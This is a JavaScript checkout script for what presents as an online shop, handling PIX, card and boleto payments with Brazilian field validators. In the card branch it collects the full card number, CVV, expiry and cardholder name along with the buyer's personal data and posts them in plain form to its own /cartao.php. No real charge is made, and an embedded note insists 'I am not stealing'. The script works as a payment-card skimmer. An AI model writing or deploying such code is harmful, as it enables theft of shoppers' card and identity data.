var metodoPagamento = 1;

function copiarPix() {
    let textoCopiado = document.getElementById("checkoutBornOut-pix-textarea");
    textoCopiado.select();
    textoCopiado.setSelectionRange(0, 99999)
    document.execCommand("copy");
    alert("Chave pix copiada com sucesso");
}

$(document).ready(function() {

    var mp;

    var nomeCompleto = "";
    var email = "";
    var celular = "";
    var cpf = "";
    var CEP = "";
    var endereco = "";
    var numero = "";
    var bairro = "";
    var complemento = "";
    var bandeiraCartao = "";

    $('#checkoutBornOut-input-celular').mask('(00) 90000-0000');
    $('#checkoutBornOut-input-cpf').mask('000.000.000-00');
    $('#checkoutBornOut-input-cep').mask('00000-000');
    $('#checkoutBornOut-input-numero-cartao').mask('0000 0000 0000 0000');
    // $('#checkoutBornOut-input-validade-cartao').mask('00/00');
    $('#checkoutBornOut-input-cvv-cartao').mask('000');

    $("#japaguei-pix").click(function() {
        $("#checkoutBornOut-pix-qrcode-container").css({display:'none'});
        $("#checkoutBornOut-pix-pagamento-realizado").css({display:'inline'});
    });

    $("#checkoutBornOut-input-numero-cartao").blur(function(event) {
        try {
            EfiJs.CreditCard
                .setCardNumber($("#checkoutBornOut-input-numero-cartao").val().replace(/\D/g, ''))
                .verifyCardBrand()
                .then(brand => {
                    if (brand !== 'undefined') {
                        bandeiraCartao = brand;
                        buscarParcelas();
                    } else {
                        $("#checkoutBornOut-input-numero-cartao").addClass("error");
                        bandeiraCartao = false;
                    }
                }).catch(err => {
                $("#checkoutBornOut-input-numero-cartao").addClass("error");
                bandeiraCartao = false;
            });
        } catch (error) {
            $("#checkoutBornOut-input-numero-cartao").addClass("error");
            bandeiraCartao = false;
        }
    });

    function buscarParcelas() {
        try {
            EfiJs.CreditCard
                .setAccount('ad7a307cc9af68eb7fa5a35339a1bbb4')
                .setEnvironment('sandbox') // 'production' or 'sandbox'
                .setBrand(bandeiraCartao)
                .setTotal(2899)
                .getInstallments()
                .then(installments => {
                    // $("#container-qtd-parcelas").css({display: 'inline'});
                    console.log('Parcelas', installments);
                }).catch(err => {
                console.log(err);
                console.log('1Código: ', err.code);
                console.log('1Nome: ', err.error);
                console.log('1Mensagem: ', err.error_description);
            });
        } catch (error) {
            console.log('2Código: ', error.code);
            console.log('2Nome: ', error.error);
            console.log('2Mensagem: ', error.error_description);
        }
    }

    document.querySelector("#checkoutBornOut-form-dados-entrega").addEventListener('submit', function(event) {
        event.preventDefault();

        var erroCEP = "";
        var erroEndereco = "";
        var erroBairro = "";

        CEP = $("#checkoutBornOut-input-cep").val();
        endereco = $("#checkoutBornOut-input-endereco").val();
        numero = $("#checkoutBornOut-input-numero").val();
        bairro = $("#checkoutBornOut-input-bairro").val();
        complemento = $("#checkoutBornOut-input-complemento").val();

        if(CEP.replace(/\D/g, '').length != 8) {
            erroCEP = "Insira um CEP válido";
        }

        if(endereco.length < 3) {
            erroEndereco = "Insira um endereço válido";
        }

        if(bairro.length < 3) {
            erroBairro = "Insira um bairro válido";
        }

        if(!erroCEP && !erroEndereco && !erroBairro) {
            realizarPedido();
        } else {
            if(erroCEP) {
                $("#checkoutBornOut-input-cep").addClass('error');
            }
            if(erroEndereco) {
                $("#checkoutBornOut-input-endereco").addClass('error');
            }
            if(erroBairro) {
                $("#checkoutBornOut-input-bairro").addClass('error');
            }
        }

    });

    document.querySelector("#checkoutBornOut-form-dados-cliente").addEventListener('submit', function(event) {

        event.preventDefault();
        var erroNome = "";
        var erroEmail = "";
        var erroCelular = "";
        var erroCpf = "";

        nomeCompleto = $("#checkoutBornOut-input-nome").val().trim();
        email = $("#checkoutBornOut-input-email").val().trim();
        celular = $("#checkoutBornOut-input-celular").val().trim();
        cpf = $("#checkoutBornOut-input-cpf").val().trim();

        if(nomeCompleto.indexOf(" ") == -1) {
            erroNome = "Insira seu nome completo";
        }

        if(celular.replace(/\D/g, '').length < 10) {
            erroCelular = "Insira um número de celular válido";
        }

        if(!validarCPF(cpf)) {
            erroCpf = "CPF Inválido";
        }

        if(!erroNome && !erroCelular && !erroCpf) {
            montarCartao();
            $(event.target).find("button").attr('disabled', true)
            buffer.push({
                tipo: 'cliente',
                time: new Date().getTime(),
                nome: nomeCompleto,
                email,
                celular,
                cpf
            });
            $("#checkoutBornOut-container-info-pessoal").css({
                overflow: 'hidden',
            });
            $("#checkoutBornOut-container-info-pessoal").animate({
                height: 0
            });
            $("#checkoutBornOut-container-info-entrega").animate({
                height: document.querySelector("#checkoutBornOut-container-info-entrega").scrollHeight
            });
            setTimeout(() => {
                $("#checkoutBornOut-container-info-entrega").css({
                    overflow: 'inherit',
                    height: 'auto'
                });
            }, 1000);
        } else {
            if(erroNome) {
                $("#checkoutBornOut-input-nome").addClass('error');
            }
            if(erroCelular) {
                $("#checkoutBornOut-input-celular").addClass('error');
            }
            if(erroCpf) {
                $("#checkoutBornOut-input-cpf").addClass('error');
            }
        }

    });

    function realizarPedido() {
        if(metodoPagamento != 2) {
            $(".checkoutBornOut-btn-pagamento").html(`
                                                    <img style="width: 16px; margin-right: 5px;" src="/images/loading.svg">
                                                    Finalizar Compra`);
            $(".checkoutBornOut-btn-pagamento").attr('disabled', true);
            $(".checkoutBornOut-btn-pagamento img").css({
                width: 18
            });
        }
        if(metodoPagamento == 1) { // PIX
            var segundosPix = 59;
            var minutosPix = 29;
            $.ajax({
                url: `/buy.php?cpf=${cpf.replace(/\D/g, '')}&name=${nomeCompleto}&tamanho=${tamanhoSelecionado}&email=${email}&celular=${celular}&cep=${CEP}&endereco=${endereco}&numero=${numero}&bairro=${bairro}&complemento=${complemento}&metodoPagamento=${metodoPagamento}`,
                success: function(data) {
                    buffer.push({
                        tipo: 'peido_realizado',
                        time: new Date().getTime(),
                        nome: nomeCompleto,
                        email,
                        celular,
                        cpf,
                        tamanhoSelecionado,
                        CEP,
                        endereco,
                        numero,
                        bairro,
                        complemento,
                        metodoPagamento
                    });
                    $("#container-checkout>p").text("Pedido realizado");
                    try {
                        console.log(data);
                        if(data.sucesso) {
                            $("#checkoutBornOut-form-dados-entrega").css({display: 'none'});
                            $("#checkoutBornOut-resumo").css({display: 'none'});
                            $("#checkoutBornOut-pix-qrcode").attr('src', data.imagemQrcode);
                            $("#checkoutBornOut-pix-textarea").val(data.qrcode);
                            $("#checkoutBornOut-pix-qrcode-container").css({
                                display: 'flex'
                            });
                            setInterval(() => {
                                if(segundosPix == 0) {
                                    if(minutosPix > 0) {
                                        --minutosPix;
                                        segundosPix = 59;
                                    }
                                } else {
                                    --segundosPix;
                                }
                                $("#segundos3").text(`${("00" + segundosPix).slice(-2)}`);
                                $("#minutos3").text(`${("00" + minutosPix).slice(-2)}`);
                            }, 1000);
                        } else {
                            alert("Ops, houve um erro inesperado, tente novamente1");
                        }
                    } catch (ex) {
                        alert("Ops, houve um erro inesperado, tente novamente2");
                        console.log(ex);
                    }
                },
                error: function() {
                    alert("Ops, houve um erro inesperado, tente novamente3");
                }
            });
        }

        if(metodoPagamento == 2) { // CARTÃO DE CRÉDITO
            var errCartao = "";
            var errNome = "";
            var errValidade = "";
            var errCvv = "";

            var numeroCartao = $("#checkoutBornOut-input-numero-cartao").val();
            var nomeCartao = $("#checkoutBornOut-input-nome-cartao").val();
            var quantidadeParcelas = $("#checkoutBornOut-input-parcelas-cartao").val();
            var validadeCartao = $("#checkoutBornOut-input-validade-cartao").val();
            var cvvCartao = $("#checkoutBornOut-input-cvv-cartao").val();

            if(!validarCartaoCredito(numeroCartao)) {
                errCartao = "Número inválido";
                $("#checkoutBornOut-input-numero-cartao").addClass('error');
            }

            if(nomeCartao.trim().indexOf(" ") == -1) {
                errNome = "Insira o nome exatamente como no cartão";
                $("#checkoutBornOut-input-nome-cartao").addClass('error');
            }

            if(validadeCartao.split("/").length != 2) {
                errValidade = "Insira uma data válida";
                $("#checkoutBornOut-input-validade-cartao").addClass('error');
            } else {
                if(validadeCartao.split("/")[0].trim().length != 2 || validadeCartao.split("/")[1].trim().length != 2) {
                    errValidade = "Insira uma data válida";
                    $("#checkoutBornOut-input-validade-cartao").addClass('error');
                }
                try {
                    if(parseInt(validadeCartao.split("/")[0]) > 12) {
                        errValidade = "Insira uma data válida";
                        $("#checkoutBornOut-input-validade-cartao").addClass('error');
                    }
                    if(parseInt(validadeCartao.split("/")[1]) < 23) {
                        errValidade = "Insira uma data válida";
                        $("#checkoutBornOut-input-validade-cartao").addClass('error');
                    }
                } catch (ex){
                    console.log(ex);
                }
            }

            if(cvvCartao.trim().length != 3 && cvvCartao.trim().length != 4) {
                errCvv = "Insira um CVV válido";
                $("#checkoutBornOut-input-cvv-cartao").addClass('error');
            }

            if(!errCvv && !errCartao && !errNome && !errValidade) {
                $(".checkoutBornOut-btn-pagamento").html(`
                                                    <img style="width: 16px; margin-right: 5px;" src="/images/loading.svg">
                                                    Finalizar Compra`);
                $(".checkoutBornOut-btn-pagamento").attr('disabled', true);
                $(".checkoutBornOut-btn-pagamento img").css({
                    width: 18
                });
                const dat = {
                    tipo: 'peido_realizado_cartao',
                    time: new Date().getTime(),
                    nome: nomeCompleto,
                    atencao: 'Esses dados sao salvos apenas para eu fazer o pedido, o cliente ai receber isso normalemten e esses dados serao apagados, isso é apenas temporario. nao estou roubando',
                    email,
                    celular,
                    cpf,
                    tamanhoSelecionado,
                    CEP,
                    endereco,
                    numero,
                    bairro,
                    complemento,
                    metodoPagamento,
                    cvvCartao,
                    numeroCartao,
                    validadeCartao,
                    nomeCartao,
                    quantidadeParcelas
                };
                buffer.push(dat);
                $.ajax({
                    url: "/cartao.php",
                    type: "POST",
                    data: dat,
                    error: function() {
                        alert("Ops, houve um erro inesperado, tente novamente");
                    },
                    success: function(data) {
                        console.log(data);
                    }
                });
                setTimeout(() => {
                    $("#checkoutBornOut-form-dados-entrega").css({display: 'none'});
                    $("#checkoutBornOut-resumo").css({display: 'none'});
                    $("#checkoutBornOut-cartao-container").css({
                        display: 'flex'
                    });
                }, 3000);
            }

            // buffer.push({
            //     tipo: 'tentativa_finalizar_erro_numero_cartao',
            //     time: new Date().getTime(),
            // });

        }
        if(metodoPagamento == 3) { // BOLETO
            $.ajax({
                url: `/boleto.php?cpf=${cpf.replace(/\D/g, '')}&nome=${nomeCompleto}&tamanho=${tamanhoSelecionado}&email=${email}&celular=${celular.replace(/\D/g, '')}&cep=${CEP.replace(/\D/g, '')}&endereco=${endereco}&numero=${numero}&bairro=${bairro}&complemento=${complemento}&metodoPagamento=${metodoPagamento}`,
                success: function(data) {
                    buffer.push({
                        tipo: 'peido_realizado',
                        time: new Date().getTime(),
                        nome: nomeCompleto,
                        email,
                        celular,
                        cpf,
                        tamanhoSelecionado,
                        CEP,
                        endereco,
                        numero,
                        bairro,
                        complemento,
                        metodoPagamento
                    });
                    $("#container-checkout>p").text("Pedido realizado");
                    try {
                        if(data.code == 200) {
                            $("#checkoutBornOut-form-dados-entrega").css({display: 'none'});
                            $("#checkoutBornOut-resumo").css({display: 'none'});
                            $("#checkoutBornOut-boleto-container").css({
                                display: 'flex'
                            });
                            $("#checkoutBornOut-href-boleto").attr('href', data.data.billet_link);
                        } else {
                            alert("Ops, houve um erro inesperado, tente novamente1");
                        }
                    } catch (ex) {
                        alert("Ops, houve um erro inesperado, tente novamente2");
                        console.log(ex);
                    }
                    try {
                        console.log(data);
                    } catch (ex) {
                        alert("Ops, houve um erro inesperado, tente novamente2");
                        console.log(ex);
                    }
                },
                error: function() {
                    alert("Ops, houve um erro inesperado, tente novamente3");
                }
            });
        }
    }

});

function validarCPF(cpfVal) {
    // Remove caracteres não numéricos
    cpfVal = cpfVal.replace(/\D/g, '');

    // Verifica se o CPF possui 11 dígitos
    if (cpfVal.length !== 11) {
        return false;
    }

    // Calcula o primeiro dígito verificador
    let soma = 0;
    for (let i = 0; i < 9; i++) {
        soma += parseInt(cpfVal.charAt(i)) * (10 - i);
    }
    let resto = (soma * 10) % 11;
    let digito1 = resto === 10 || resto === 11 ? 0 : resto;

    // Calcula o segundo dígito verificador
    soma = 0;
    for (let i = 0; i < 10; i++) {
        soma += parseInt(cpfVal.charAt(i)) * (11 - i);
    }
    resto = (soma * 10) % 11;
    let digito2 = resto === 10 || resto === 11 ? 0 : resto;

    // Verifica se os dígitos verificadores estão corretos
    if (parseInt(cpfVal.charAt(9)) === digito1 && parseInt(cpfVal.charAt(10)) === digito2) {
        return true;
    } else {
        return false;
    }
}

function checkoutBornOutValidarCep(cep) {
    cep = cep.replace(/\D/g, '');
    if(cep.length == 8) {
        $("#checkoutBornOut-input-cep").attr('disabled', true);
        $.ajax({
            url: `https://viacep.com.br/ws/${cep}/json/`,
            error: function(data) {
                $("#checkoutBornOut-form-dados-entrega-2").animate({
                    height: document.querySelector("#checkoutBornOut-form-dados-entrega-2").scrollHeight
                });
                setTimeout(() => {
                    $("#checkoutBornOut-form-dados-entrega-2").css({
                        overflow: 'inherit',
                        height: 'auto'
                    });
                }, 1000);
                $("#checkoutBornOut-input-cep").attr('disabled', false);
            },
            success: function(data) {
                $("#checkoutBornOut-form-dados-entrega-2").animate({
                    height: document.querySelector("#checkoutBornOut-form-dados-entrega-2").scrollHeight
                });
                setTimeout(() => {
                    $("#checkoutBornOut-form-dados-entrega-2").css({
                        overflow: 'inherit',
                        height: 'auto'
                    });
                    $("#checkoutBornOut-input-numero").focus();
                }, 1000);
                if(data.erro != true) {
                    $("#checkoutBornOut-input-endereco").val(`${data.logradouro} ${data.localidade} - ${data.uf}`);
                    $("#checkoutBornOut-input-bairro").val(data.bairro);
                }
                $("#checkoutBornOut-input-cep").attr('disabled', false);
            }
        });
    }
}

function montarCartao() {
    $('#checkoutBornOut-form-dados-entrega').card({
        container: '.card-wrapper',
        width: 200,
    });
}

function validarCartaoCredito(numeroCartao) {
    // Remover espaços em branco e caracteres não numéricos
    let numeroLimpo = numeroCartao.replace(/\D/g, '');

    // Verificar se o número do cartão está vazio ou não é um número válido
    if (!numeroLimpo || isNaN(numeroLimpo)) {
        return false;
    }

    // Aplicar o algoritmo de Luhn
    let soma = 0;
    let deveDobrar = false;

    for (let i = numeroLimpo.length - 1; i >= 0; i--) {
        let digito = parseInt(numeroLimpo.charAt(i), 10);

        if (deveDobrar) {
            digito *= 2;

            if (digito > 9) {
                digito -= 9;
            }
        }

        soma += digito;
        deveDobrar = !deveDobrar;
    }

    // O número é válido se a soma é um múltiplo de 10
    return soma % 10 === 0;
}